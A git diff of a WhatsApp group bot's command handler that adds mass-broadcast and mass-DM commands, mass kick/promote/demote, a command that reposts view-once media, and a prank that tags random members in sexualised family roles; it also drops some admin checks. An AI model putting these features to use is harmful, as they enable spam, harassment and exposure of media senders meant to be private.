-                    replygcxeon(`Successfully Changed AutoBio To ${q}`)
+                    replygcxeon(`Successfully Changed Auto Sticker To ${q}`)
                 } else if (q == 'off') {
                     db.data.settings[botNumber].autosticker = false
-                    replygcxeon(`Successfully Changed AutoBio To ${q}`)
+                    replygcxeon(`Successfully Changed Auto Sticker To ${q}`)
+                }
+            break
+            case 'autodownload': case 'autodl':
+if (!XeonTheCreator) return XeonStickOwner()
+                if (args.length < 1) return replygcxeon(`Example ${prefix + command} on/off`)
+                if (q == 'on') {
+                    db.data.settings[botNumber].autodownload = true
+                    replygcxeon(`Successfully Changed Auto Download To ${q}`)
+                } else if (q == 'off') {
+                    db.data.settings[botNumber].autodownload = false
+                    replygcxeon(`Successfully Changed Auto Download To ${q}`)
                 }
             break
             case 'autoblock':
@@ -1849,7 +1964,7 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
             case 'out':
                 if (!XeonTheCreator) return XeonStickOwner()
                 if (!m.isGroup) return XeonStickGroup()
-                replygcxeon('Bye Everyone, I will come back later 🥺')
+                replygcxeon('Bye Everyone 🥺')
                 await XeonBotInc.groupLeave(m.chat)
             break
             case 'bc':
@@ -1880,6 +1995,28 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                replygcxeon(`Success ${command} To ${Object.keys(global.db.data.users).length} Users`)
             }
             break
+            case 'jpm': case 'post': {
+if (!XeonTheCreator) return XeonStickOwner()
+if (!text) return replygcxeon(`*Incorrect Usage Please Use Like This*\n${prefix+command} text|pause\n\nReply Image To Send Images to All Groups\nFor a pause, 1000 = 1 second\n\nExample: ${prefix + command} hello|9000`)
+await replygcxeon(`Waiting in progress`)
+let getGroups = await XeonBotInc.groupFetchAllParticipating()
+let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
+let anu = groups.map((v) => v.id)
+for (let xnxx of anu) {
+let metadat72 = await XeonBotInc.groupMetadata(xnxx)
+let participanh = await metadat72.participants
+if (/image/.test(mime)) {
+media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
+mem = await uptotelegra(media)
+await XeonBotInc.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
+await sleep(text.split('|')[1])
+} else {
+await XeonBotInc.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
+await sleep(text.split('|')[1])
+}}
+replygcxeon(`Success`)
+}
+break
             case 'pushcontact': {
     if (!XeonTheCreator) return XeonStickOwner()
       if (!m.isGroup) return replygcxeon(`The feature works only in grup`)
@@ -1905,6 +2042,36 @@ await sleep(5000)
 replygcxeon(`Success`)
 }
 break
+case 'pushcontactv3':
+if (!XeonTheCreator) return XeonStickOwner()
+if (!isGroup) return XeonStickGroup()
+if (!text) return replygcxeon(
+`
+*Usage example :*
+
+${prefix+command} pause|text
+
+‼️Reply Image To Send Images to All Participants, For a pause, 1000 = 1 second
+`
+)
+let jedany = text.split("|")[0]
+let captny = text.split("|")[1]
+const halsss = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
+for (let men of halsss) {
+if (/image/.test(mime)) {
+media = await XeonBotInc.downloadAndSaveMediaMessage(quoted)
+mem = await TelegraPh(media)
+await XeonBotInc.sendMessage(men, { image: { url: mem }, caption: captny }, { quoted: m })
+await sleep(1000)
+await XeonBotInc.sendMessage(men, { text: captny  }, { quoted: m })
+await sleep(jedany)
+} else {
+await XeonBotInc.sendMessage(men, { text: captny  }, { quoted: m })
+await sleep(jedany)
+}
+}
+replygcxeon(`Success`)
+break
 case 'block': case 'ban': {
 		if (!XeonTheCreator) return XeonStickOwner()
 		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
@@ -1922,7 +2089,7 @@ case 'block': case 'ban': {
             case 'bcgc':
             case 'bcgroup': {
                 if (!XeonTheCreator) return XeonStickOwner()
-                if (!text) return replygcxeon(`Text mana?\n\nExample : ${prefix + command} Enter the text`)
+                if (!text) return replygcxeon(`Text mana?\n\nExample : ${prefix + command} Besok Libur `)
                 let getGroups = await XeonBotInc.groupFetchAllParticipating()
                 let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                 let anu = groups.map(v => v.id)
@@ -1937,7 +2104,7 @@ case 'block': case 'ban': {
                                 showAdAttribution: true,
                                 title: botname,
                                 body: `Sent in ${i.length} Group`,
-                                thumbnailUrl: 'https://telegra.ph/file/b95e06cbc7d90c2f1b3c8.jpg',
+                                thumbnailUrl: 'https://telegra.ph/file/ac82d30b1d7acc3fe1ff0.jpg',
                                 sourceUrl: websitex,
                                 mediaType: 1,
                                 renderLargerThumbnail: true
@@ -2013,6 +2180,9 @@ replygcxeon('Success in turning off nsfw in this group')
   }
   }
   break
+  case 'userjid':
+  case 'jid':
+  case 'groupjid':
             case 'id':{
             replygcxeon(from)
            }
@@ -2064,33 +2234,6 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
             })
         }
         break
-        case 'antipromote':{
-		         if (!m.isGroup) return XeonStickGroup()
-                 if (!XeonTheCreator) return XeonStickOwner()
-               if (args.length < 1) return replygcxeon('on/off?')
-               if (args[0] === 'on') {
-                  db.data.chats[from].antipromote = true
-                  replygcxeon(`${command} is enabled`)
-               } else if (args[0] === 'off') {
-                  db.data.chats[from].antipromote = false
-                  replygcxeon(`${command} is disabled`)
-               }
-               }
-            break
-	   case 'antidemote':{
-		         if (!m.isGroup) return XeonStickGroup()
-if (!isBotAdmins) return XeonStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
-               if (args.length < 1) return replygcxeon('on/off?')
-               if (args[0] === 'on') {
-                  db.data.chats[from].antidemote = true
-                  replygcxeon(`${command} is enabled`)
-               } else if (args[0] === 'off') {
-                  db.data.chats[from].antidemote = false
-                  replygcxeon(`${command} is disabled`)
-               }
-               }
-            break
             case 'antipoll':{
             	if (!m.isGroup) return XeonStickGroup()
 if (!isBotAdmins) return XeonStickBotAdmin()
@@ -2175,10 +2318,25 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                }
                }
             break
+            case 'readviewonce': {
+	if (!m.quoted) return replygcxeon(`Reply to view once message`)
+	if (m.quoted.mtype !== 'viewOnceMessageV2') return replygcxeon(`This is not a view once message`)
+    let msg = m.quoted.message
+    let type = Object.keys(msg)[0]
+    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
+    let buffer = Buffer.from([])
+    for await (const chunk of media) {
+        buffer = Buffer.concat([buffer, chunk])
+    }
+    if (/video/.test(type)) {
+        return XeonBotInc.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
+    } else if (/image/.test(type)) {
+        return XeonBotInc.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
+    }
+}
+break
             case 'antiviewonce':{
 		         if (!m.isGroup) return XeonStickGroup()
-if (!isBotAdmins) return XeonStickBotAdmin()
-if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                if (args.length < 1) return replygcxeon('on/off?')
                if (args[0] === 'on') {
                   db.data.chats[from].antiviewonce = true
@@ -2189,6 +2347,33 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                }
                }
             break
+            case 'antispam':{
+		         if (!m.isGroup) return XeonStickGroup()
+if (!isBotAdmins) return XeonStickBotAdmin()
+if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
+               if (args.length < 1) return replygcxeon('on/off?')
+               if (args[0] === 'on') {
+                  db.data.chats[from].antispam = true
+                  replygcxeon(`${command} is enabled`)
+               } else if (args[0] === 'off') {
+                  db.data.chats[from].antispam = false
+                  replygcxeon(`${command} is disabled`)
+               }
+               }
+            break
+            case 'antipromote':{
+                if (!m.isGroup) return XeonStickGroup()
+                if (!XeonTheCreator) return XeonStickOwner()
+              if (args.length < 1) return replygcxeon('on/off?')
+              if (args[0] === 'on') {
+                 db.data.chats[from].antipromote = true
+                 replygcxeon(`${command} is enabled`)
+              } else if (args[0] === 'off') {
+                 db.data.chats[from].antipromote = false
+                 replygcxeon(`${command} is disabled`)
+              }
+              }
+           break
             case 'antimedia':{
 		         if (!m.isGroup) return XeonStickGroup()
 if (!isBotAdmins) return XeonStickBotAdmin()
@@ -2269,6 +2454,20 @@ if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
                   replygcxeon(`${command} is enabled`)
                } else if (args[0] === 'off') {
                   db.data.chats[from].antilinkgc = false
+                  replygcxeon(`${command} is disabled`)
+               }
+            }
+            break
+            case 'antipromotion': {
+               if (!m.isGroup) return XeonStickGroup()
+if (!isBotAdmins) return XeonStickBotAdmin()
+if (!isAdmins && !XeonTheCreator) return XeonStickAdmin()
+               if (args.length < 1) return replygcxeon('on/off?')
+               if (args[0] === 'on') {
+                  db.data.chats[from].antipromotion = true
+                  replygcxeon(`${command} is enabled`)
+               } else if (args[0] === 'off') {
+                  db.data.chats[from].antipromotion = false
                   replygcxeon(`${command} is disabled`)
                }
             }
@@ -2380,17 +2579,7 @@ break
                 await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwww], 'remove')
                 replygcxeon(mess.done)
                 break
-                 case 'kickall':
-                if (!isAdmins && !isGroupOwner) return XeonStickAdmin()
-                if (!m.isGroup) return XeonStickGroup()
-                if (!isBotAdmins) return XeonStickBotAdmin()
-                participants.map(jid => ({
-                    tag: 'participant',
-                    attrs: { jid }
-                }))
-                await XeonBotInc.groupParticipantsUpdate(participants.map(a => a.id), 'remove')             
-                
-                break
+
                 case "idgroup": case "groupid": {
 if (!XeonTheCreator) return XeonStickOwner()
 let getGroups = await XeonBotInc.groupFetchAllParticipating()
@@ -2525,12 +2714,9 @@ break
                 if (!m.isGroup) return XeonStickGroup()
                 if (!isAdmins && !isGroupOwner && !XeonTheCreator) return XeonStickAdmin()
                 if (!isBotAdmins) return XeonStickBotAdmin()
-                if (db.data.chats[from].antipromote!= true)
-                {
                 let blockwwwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                 await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwwwww], 'promote')
-                replygcxeon(mess.done)}
-                
+                replygcxeon(mess.done)
                 break
             case 'demote':
                 if (!m.isGroup) return XeonStickGroup()
@@ -2538,18 +2724,6 @@ break
                 if (!isBotAdmins) return XeonStickBotAdmin()
                 let blockwwwwwa = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                 await XeonBotInc.groupParticipantsUpdate(m.chat, [blockwwwwwa], 'demote')
-                replygcxeon(mess.done)
-                break
-            case 'demoteall':
-                if (!m.isGroup) return XeonStickGroup()
-                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return XeonStickAdmin()
-                if (!isBotAdmins) return XeonStickBotAdmin()
-                let dtall = groupAdmins + '@s.whatsapp.net'
-                for (let mem of groupAdmins)
-                    {
-                    await XeonBotInc.groupParticipantsUpdate(m.chat, [dtall], 'demote')
-                     dtall += `${mem.id.split('@')[0]}`
-                    }
                 replygcxeon(mess.done)
                 break
             case 'setnamegc':
@@ -2664,7 +2838,6 @@ if (!XeonTheCreator) return XeonStickOwner()
                 break
             case 'tagall':
             case 'tag':
-                
                 let me = m.sender
                 let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝\n😶 *Tagger :*  @${me.split('@')[0]}\n🌿 *Message : ${q ? q : 'no message'}*\n\n`
                 for (let mem of participants) {
@@ -2677,9 +2850,70 @@ if (!XeonTheCreator) return XeonStickOwner()
                     quoted: m
                 })
             break
+            case 'kickall': {
+ if (!m.isGroup) return XeonStickGroup()
+ if (!isAdmins && !isGroupOwner && !XeonTheCreator) return XeonStickAdmin()
+ if (!isBotAdmins) return XeonStickBotAdmin()
+  const xeonkickall = (args[0] === 'numBut')
+  ? text.replace(`${args[0]} `, '').split('|')
+  : (Number(args[0]))
+    ? groupMetadata.participants
+      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
+      .map(item => item.id)
+    : groupMetadata.participants
+      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
+      .map(item => item.id);
+ if (global.welcome === true) {
+ welcome = false;
+  }
+ for (let remove of xeonkickall) {
+ await XeonBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
+ await sleep(100);
+ }
+ replygcxeon(`Success`);
+}
+break
+case 'promoteall': {
+ if (!m.isGroup) return XeonStickGroup()
+ if (!isAdmins && !isGroupOwner && !XeonTheCreator) return XeonStickAdmin()
+ if (!isBotAdmins) return XeonStickBotAdmin()
+  const xeonpromoteall = (args[0] === 'numBut')
+  ? text.replace(`${args[0]} `, '').split('|')
+  : (Number(args[0]))
+    ? groupMetadata.participants
+      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
+      .map(item => item.id)
+    : groupMetadata.participants
+      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
+      .map(item => item.id);
+ for (let promote of xeonpromoteall) {
+ await XeonBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${promote}@s.whatsapp.net` : promote], "promote");
+ await sleep(100);
+ }
+ replygcxeon(`Success`);
+}
+break
+case 'demoteall': {
+ if (!m.isGroup) return XeonStickGroup()
+ if (!isAdmins && !isGroupOwner && !XeonTheCreator) return XeonStickAdmin()
+ if (!isBotAdmins) return XeonStickBotAdmin()
+  const xeondemoteall = (args[0] === 'numBut')
+  ? text.replace(`${args[0]} `, '').split('|')
+  : (Number(args[0]))
+    ? groupMetadata.participants
+      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
+      .map(item => item.id)
+    : groupMetadata.participants
+      .filter(item => item.id !== botNumber && item.id !== `${ownernumber}@s.whatsapp.net`)
+      .map(item => item.id);
+ for (let demote of xeondemoteall) {
+ await XeonBotInc.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${demote}@s.whatsapp.net` : demote], "demote");
+ await sleep(100);
+ }
+ replygcxeon(`Success`);
+}
+break
             case 'hidetag':
-                if (!m.isGroup) return XeonStickGroup()
-                if (!isAdmins && !isGroupOwner && !XeonTheCreator) return XeonStickAdmin()
                 if (!isBotAdmins) return XeonStickBotAdmin()
                 XeonBotInc.sendMessage(m.chat, {
                     text: q ? q : '',
@@ -2905,35 +3139,351 @@ break
                     })
             break
                 //bot status
-            case 'ping': case 'botstatus': case 'statusbot': case 'p':
-                let fgg = { key: { fromMe: true, participant: `0@s.whatsapp.net`, remoteJid: 'status@broadcast' }, message: { contactMessage: { displayName: `꧁﴿.·»✥«·-𝕯𝕯 𝕮𝖍𝖊𝖊𝖒𝖘-𝕭𝖔𝖙-·»✥«.·﴾꧂\n 😎😎===================================😎😎\n Created by: ${ownername}`, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;a,;;;\nFN:'CHEEMS-BOT'\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`}}}
-                let timestampe = speed()
-                let latensie = speed() - timestampe
-                 let ping = `> 📌 Hey there, 🤗
+                case 'ping': case 'botstatus': case 'statusbot': case 'p':
+                    let fgg = { key: { fromMe: true, participant: `0@s.whatsapp.net`, remoteJid: 'status@broadcast' }, message: { contactMessage: { displayName: `꧁﴿.·»✥«·-𝕯𝕯 𝕮𝖍𝖊𝖊𝖒𝖘-𝕭𝖔𝖙-·»✥«.·﴾꧂\n 😎😎===================================😎😎\n Created by: ${ownername}`, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;a,;;;\nFN:'CHEEMS-BOT'\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`}}}
+                    let timestampe = speed()
+                    let latensie = speed() - timestampe
+                     let ping = `> 📌 Hey there, 🤗
 > ${botname} 
 > is online 📡🛰️
 > 📌 ʀᴇsᴘᴏɴsᴇ sᴘᴇᴇᴅ :  ${latensie.toFixed(4)} ms 🏃
 > 📌 ʀᴜɴᴛɪᴍᴇ : ${runtime(process.uptime())}⏰
 >  
 > 📌 ᴄʀᴇᴀᴛᴇᴅ ʙʏ : ${ownername} 👑`
+await XeonBotInc.sendMessage(m.chat, { react: { text: `🏃🏼‍♂️`, key: m.key }})
 
-                XeonBotInc.sendMessage(m.chat, {
-                    text: ping,
-                }, {
-                    quoted: fgg
-                })
-                break
-    case 'relay':
-    if (!isPremium) return replygcxeon(mess.premium)
-       let message = q ? q : ''
-        XeonBotInc.relayMessage(m.chat, {
-            scheduledCallCreationMessage: {
-                callType: "VIDEO",
-                scheduledTimestampMs: `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
-                title: message
+                    XeonBotInc.sendMessage(m.chat, {
+                        text: ping,
+                      
+                    }, {
+                        quoted: fgg
+                    })
+                    break
+        case 'relay':
+        if (!isPremium) return replygcxeon(mess.premium)
+           let message = q ? q : ''
+            XeonBotInc.relayMessage(m.chat, {
+                scheduledCallCreationMessage: {
+                    callType: "VIDEO",
+                    scheduledTimestampMs: `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+                    title: message
+                }
+            }, {})
+            
+              break
+              
+case 'u':
+    {
+       let user= m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') 
+       let username =XeonBotInc.getName(user)
+       console.log(json)
+       const res = json[0]
+  let message =`your username is ${username}`
+  XeonBotInc.sendMessage(m.chat,
+    { text: message,
+     contextInfo:{
+             "externalAdReply": {"showAdAttribution": true,
+             "containsAutoReply": true,
+             "title": ` ${global.botname}`,
+             "body": `${ownername}`,
+             "previewType": "PHOTO",
+            "thumbnailUrl": ``,
+            "thumbnail": XeonWlcm,
+             "sourceUrl": `${websitex}`}
+                }
+    })
+    }
+    break
+
+    case 'family': case 'fm' : {
+        if (!m.isGroup) return XeonStickGroup()
+        function getRandomPercentage() {
+            return Math.floor(Math.random() * 100) + 1;
+        }
+        let ps = groupMetadata.participants.map(v => v.id);
+        let b,c,d,e,f,g,h,j,k,l,n,o,p,q,
+        a= m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+        b= ps[Math.floor(Math.random() * ps.length)]
+        c= ps[Math.floor(Math.random() * ps.length)]
+        d= ps[Math.floor(Math.random() * ps.length)]
+        e= ps[Math.floor(Math.random() * ps.length)]
+        f= ps[Math.floor(Math.random() * ps.length)]
+        g= ps[Math.floor(Math.random() * ps.length)]
+        h= ps[Math.floor(Math.random() * ps.length)]
+        i= ps[Math.floor(Math.random() * ps.length)]
+        k= ps[Math.floor(Math.random() * ps.length)]
+        l= ps[Math.floor(Math.random() * ps.length)]
+        n= ps[Math.floor(Math.random() * ps.length)]
+        o= ps[Math.floor(Math.random() * ps.length)]
+        p= ps[Math.floor(Math.random() * ps.length)]
+        q= ps[Math.floor(Math.random() * ps.length)]
+    
+    
+            b= ps[Math.floor(Math.random() * ps.length)]
+        do {
+        b= ps[Math.floor(Math.random() * ps.length)]
+        } while (a==b);
+    
+        do {
+         c= ps[Math.floor(Math.random() * ps.length)]
+        } while (c==b||c==a);
+    
+        do{
+         d= ps[Math.floor(Math.random() * ps.length)]
+        } while (d==c||d==b||d==a);
+    
+        do{
+         e= ps[Math.floor(Math.random() * ps.length)]
+        } while (e==d||e==c||e==b||e==a);
+    
+        do{
+         f= ps[Math.floor(Math.random() * ps.length)]
+        } while (f==e||f==d||f==c||f==b||f==a);
+         
+        do{
+         g= ps[Math.floor(Math.random() * ps.length)]
+        } while (g==f||g==e||g==d||g==c||g==b||g==a);
+    
+        do { 
+         h= ps[Math.floor(Math.random() * ps.length)]
+        } while (h==a||h==b||h==c||h==d||h==f||h==g);
+    
+        do {
+         i= ps[Math.floor(Math.random() * ps.length)]
+        } while (i==a||i==b||i==c||i==d||i==e||i==f||i==g||i==h);
+        do {
+         j= ps[Math.floor(Math.random() * ps.length)]
+        } while (j==a||j==b||j==c||j==d||j==e||j==f||j==g||j==h||j==i);
+    
+        do {
+         k= ps[Math.floor(Math.random() * ps.length)]
+        } while (k==a||k==b||k==c||k==d||k==e||k==f||k==g||k==h||k==i||k==j);
+    
+         do {
+         l= ps[Math.floor(Math.random() * ps.length)]
+         } while (l==a||l==b||l==c||l==d||l==e||l==f||l==g||l==h||l==i||l==j||l==k);
+         
+         do {
+         n= ps[Math.floor(Math.random() * ps.length)]
+        } while (n==a||n==b||n==c||n==d||n==e||n==f||n==g||n==h||n==i||n==j||n==k||n==l);
+    
+        do {
+         o= ps[Math.floor(Math.random() * ps.length)]
+        } while (o==a||o==b||o==c||o==d||o==e||o==f||o==g||o==h||o==i||o==j||o==k||o==l||o==n);
+         p= ps[Math.floor(Math.random() * ps.length)]
+         q= ps[Math.floor(Math.random() * ps.length)]
+       
+    
+        const percentage = getRandomPercentage();
+        xeonbody = `গোপন সূত্র থেকে পাওয়া @${a.split("@")[0]} চৌদ্দগুষ্টির বিবরণ:\n
+    মা :‌-        @${b.split("@")[0]}🫃
+    বাবা :-       @${c.split("@")[0]}💦
+    ভাই/বোন :-  @${d.split("@")[0]}💆
+    বর/বউ :-    @${e.split("@")[0]}👫
+    Bf/Gf :-     @${f.split("@")[0]} 👩‍❤‍💋‍👨
+    Ex :-        @${g.split("@")[0]} 🤡
+    ঘটক :-       @${h.split("@")[0]} 😁
+    শশুর :-      @${i.split("@")[0]}🧚
+    শাশুরি:-      @${j.split("@")[0]} 🧚
+    ক্রাশ :-      @${k.split("@")[0]} 🥵
+    বাচ্চা:        ${percentage} টি \n
+    1st বাচ্চা:    @${l.split("@")[0]}👶🏼
+    
+    @${a.split("@")[0]} এই হল তোমার আসল পরিচয় কাল সবাইকে নিয়ে নবান্ন দেখা কর।🤸‍♂`
+    try {
+            ppuser = await XeonBotInc.profilePictureUrl(a, 'image')
+        } catch (err) {
+        ppuser = 'https://images.app.goo.gl/5kHFgvSatAYWunaw9'
+        }
+    XeonWlcm = await getBuffer(ppuser)
+    
+    XeonBotInc.sendMessage(m.chat,
+        { text: xeonbody,
+            image: XeonWlcm,
+        contextInfo:{
+        mentionedJid:[a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q],
+        externalAdReply: {
+            showAdAttribution: true,
+            title: botname,
+            body: ownername,
+            thumbnail: XeonWlcm,
+            sourceUrl: websitex,
+            mediaType: 1,
+        }}}, {
+            quoted: m
+        })
+     }
+    break
+    case 'familymembers': case 'family2' : {
+        if (!m.isGroup) return XeonStickGroup()
+        function getRandomPercentage() {
+            return Math.floor(Math.random() * 100) + 1;
+        }
+        let ps = groupMetadata.participants.map(v => v.id);
+        let b,c,d,e,f,g,h,j,k,l,n,o,p,q,
+        a= m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+        b= ps[Math.floor(Math.random() * ps.length)]
+        c= ps[Math.floor(Math.random() * ps.length)]
+        d= ps[Math.floor(Math.random() * ps.length)]
+        e= ps[Math.floor(Math.random() * ps.length)]
+        f= ps[Math.floor(Math.random() * ps.length)]
+        g= ps[Math.floor(Math.random() * ps.length)]
+        h= ps[Math.floor(Math.random() * ps.length)]
+        i= ps[Math.floor(Math.random() * ps.length)]
+        k= ps[Math.floor(Math.random() * ps.length)]
+        l= ps[Math.floor(Math.random() * ps.length)]
+        n= ps[Math.floor(Math.random() * ps.length)]
+        o= ps[Math.floor(Math.random() * ps.length)]
+        p= ps[Math.floor(Math.random() * ps.length)]
+        q= ps[Math.floor(Math.random() * ps.length)]
+    
+    
+            b= ps[Math.floor(Math.random() * ps.length)]
+        do {
+        b= ps[Math.floor(Math.random() * ps.length)]
+        } while (a==b);
+    
+        do {
+         c= ps[Math.floor(Math.random() * ps.length)]
+        } while (c==b||c==a);
+    
+        do{
+         d= ps[Math.floor(Math.random() * ps.length)]
+        } while (d==c||d==b||d==a);
+    
+        do{
+         e= ps[Math.floor(Math.random() * ps.length)]
+        } while (e==d||e==c||e==b||e==a);
+    
+        do{
+         f= ps[Math.floor(Math.random() * ps.length)]
+        } while (f==e||f==d||f==c||f==b||f==a);
+         
+        do{
+         g= ps[Math.floor(Math.random() * ps.length)]
+        } while (g==f||g==e||g==d||g==c||g==b||g==a);
+    
+        do { 
+         h= ps[Math.floor(Math.random() * ps.length)]
+        } while (h==a||h==b||h==c||h==d||h==f||h==g);
+    
+        do {
+         i= ps[Math.floor(Math.random() * ps.length)]
+        } while (i==a||i==b||i==c||i==d||i==e||i==f||i==g||i==h);
+        do {
+         j= ps[Math.floor(Math.random() * ps.length)]
+        } while (j==a||j==b||j==c||j==d||j==e||j==f||j==g||j==h||j==i);
+    
+        do {
+         k= ps[Math.floor(Math.random() * ps.length)]
+        } while (k==a||k==b||k==c||k==d||k==e||k==f||k==g||k==h||k==i||k==j);
+    
+         do {
+         l= ps[Math.floor(Math.random() * ps.length)]
+         } while (l==a||l==b||l==c||l==d||l==e||l==f||l==g||l==h||l==i||l==j||l==k);
+         
+         do {
+         n= ps[Math.floor(Math.random() * ps.length)]
+        } while (n==a||n==b||n==c||n==d||n==e||n==f||n==g||n==h||n==i||n==j||n==k||n==l);
+    
+        do {
+         o= ps[Math.floor(Math.random() * ps.length)]
+        } while (o==a||o==b||o==c||o==d||o==e||o==f||o==g||o==h||o==i||o==j||o==k||o==l||o==n);
+         p= ps[Math.floor(Math.random() * ps.length)]
+         q= ps[Math.floor(Math.random() * ps.length)]
+       
+    
+        const percentage = getRandomPercentage();
+        maa=XeonBotInc.getName(a),
+        baba=XeonBotInc.getName(b),
+        vai=XeonBotInc.getName(c),
+        bou=XeonBotInc.getName(d),
+        bf=XeonBotInc.getName(e),
+        bariwala=XeonBotInc.getName(f),
+        ex=XeonBotInc.getName(j),
+        sosur=XeonBotInc.getName(g),
+        sasuri=XeonBotInc.getName(h),
+        crush=XeonBotInc.getName(i),
+    
+        xeonbody = `গোপন সূত্র থেকে পাওয়া @${a.split("@")[0]} চৌদ্দগুষ্টির বিবরণ:\n
+    মা :‌-        ${maa}🫃
+    বাবা :-       ${baba}💦
+    ভাই/বোন :-  ${vai}💆
+    বর/বউ :-    ${bou}👫
+    Bf/Gf :-     ${bf} 👩‍❤‍💋‍👨
+    Ex :-        ${ex} 🤡
+    বাড়িওয়ালা :-  ${bariwala} 🏟
+    শশুর :-      ${sosur}🧚
+    শাশুরি:-      ${sasuri} 🧚
+    ক্রাশ :-      ${crush} 🥵
+    বাচ্চা:        ${percentage} টি \n
+    @${a.split("@")[0]} এই হল তোমার আসল পরিচয় কাল সবাইকে নিয়ে নবান্ন দেখা কর।🤸‍♂`
+    try {
+            ppuser = await XeonBotInc.profilePictureUrl(a, 'image')
+        } catch (err) {
+        ppuser = 'https://images.app.goo.gl/5kHFgvSatAYWunaw9'
+        }
+    XeonWlcm = await getBuffer(ppuser)
+    
+    XeonBotInc.sendMessage(m.chat,
+        { text: xeonbody,
+            image: XeonWlcm,
+        contextInfo:{
+        mentionedJid:[a],
+        externalAdReply: {
+            showAdAttribution: true,
+            title: botname,
+            body: ownername,
+            thumbnail: XeonWlcm,
+            sourceUrl: websitex,
+            mediaType: 1,
+        }}}, {
+            quoted: m
+        })
+     }
+    break
+    case 'upp': case 'profpic': {
+        a= m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
+        try {
+            ppuser = await XeonBotInc.profilePictureUrl(a, 'image')
+            } catch (err) {
+            ppuser = 'https://images.app.goo.gl/5kHFgvSatAYWunaw9'
             }
-        }, {})
-          break
+            XeonWlcm = await getBuffer(ppuser)
+            let username =XeonBotInc.getName(a)
+            dpuser = `here is ${username} 's profile picture`
+            XeonBotInc.sendMessage(m.chat, {
+                image: XeonWlcm,
+                caption: dpuser,
+                mentionjid: [a],
+                
+            }, {
+                quoted: m
+            })
+    
+    }
+        break
+
+
+             case 'groupowner': {
+                        XeonBotInc.sendMessage(m.chat,
+                        { text: ` This Group was Created by @${groupOwner.split("@")[0]}👑`,
+                        contextInfo:{
+                        mentionedJid:[groupOwner],
+                        forwardingScore: 9999999,
+                        isForwarded: true, 
+                        "externalAdReply": {
+                        "showAdAttribution": true,
+                        "containsAutoReply": true,
+                        "title": ` ${global.botname}`,
+                        "body": `${ownername}`,
+                        "previewType": "PHOTO",
+                        "thumbnailUrl": ``,
+                        "thumbnail": fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
+                        "sourceUrl": `${websitex}`}}},
+                        { quoted: m})        
+                                    }
+        break
 	case 'repo': case 'repository': {
   try {
     const [, username, repoName] = botscript.match(/github\.com\/([^/]+)\/([^/]+)/)
@@ -2972,7 +3522,7 @@ ${themeemoji} URL: ${repoData.html_url}
 break
             case 'buypremium':
             case 'premiumuser': {
-                let teks = `Hi ${pushname}👋\nWant to Buy Premium? call ${ownernumber} 😉`
+                let teks = `Hi ${pushname}👋\nWant to Buy Premium?Just chat with the owner😉`
                 await XeonBotInc.sendMessage(m.chat, {
                     text: teks,
                     contextInfo: {
@@ -2980,7 +3530,7 @@ break
                             showAdAttribution: true,
                             title: botname,
                             body: ownername,
